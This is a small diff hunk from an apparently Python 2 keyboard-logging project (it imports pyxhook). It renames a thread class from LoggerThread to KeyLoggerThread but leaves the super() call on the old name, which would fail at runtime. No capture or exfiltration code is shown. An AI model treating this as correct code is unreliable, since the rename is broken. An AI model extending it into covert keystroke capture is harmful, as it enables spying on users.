@@ -10,7 +10,7 @@ import pyxhook
 import ConfigParser
 from command import CommandRunner
 
-class LoggerThread(threading.Thread):
+class KeyLoggerThread(threading.Thread):
     
     def __init__(self):
         super(LoggerThread, self).__init__()
